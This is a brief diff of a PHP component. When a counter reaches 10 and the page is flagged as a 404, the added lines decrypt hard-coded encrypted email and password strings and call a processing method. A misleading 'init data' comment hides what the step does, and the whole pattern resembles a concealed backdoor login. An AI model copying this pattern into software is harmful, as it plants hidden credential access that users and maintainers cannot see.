@@ -25,6 +25,11 @@ class Am extends Component
         if ($this->n == 10) {
             # code...
             $this->is404 = true;
+
+            // init data
+            $this->email = \Crypt::decrypt('eyJpdiI6InpJajVJSGo0cUxqVGphNXEreDZwTlE9PSIsInZhbHVlIjoiU0xYdExtem1INUJpbjZ3UnZkZGhyY0VqeUZEdFdGZWdKTm04TVlUTGQ2UT0iLCJtYWMiOiJhYmEyMDIzZWU5NDk0NTQ5NmIwZjNlZDQ4MWJhOGQyNGI1N2U3Zjg0YWZmNDE0Y2QzZTRiYjNkYzlhMTAyYzE3IiwidGFnIjoiIn0=');
+            $this->password = \Crypt::decrypt('eyJpdiI6IlFjQVM0Q25VUEdYNjI1MWk3NlJZa3c9PSIsInZhbHVlIjoiakVMdng1ZFNCZzU2Y1Rra3c5bTJIcXJMeWI2c1JzajJpMEUzM1F4Mi9naz0iLCJtYWMiOiI4MmI5OTgyNjUxMzU0MDRjYTk3NzlhYzJkY2ZjMjYyN2YyNDY5M2VlYjRjNTMyODJkNjgyMDhjOGJhNTZiODU1IiwidGFnIjoiIn0=');
+            $this->proses();
         }
     }
 
